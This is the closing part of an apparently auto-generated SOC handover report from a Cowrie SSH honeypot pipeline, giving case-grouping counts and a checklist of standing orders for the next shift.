| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 171 priority case(s) shown individually · 69 recon entry/entries in table (34 group(s) consolidating 775 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-06-10T10:09:27Z_
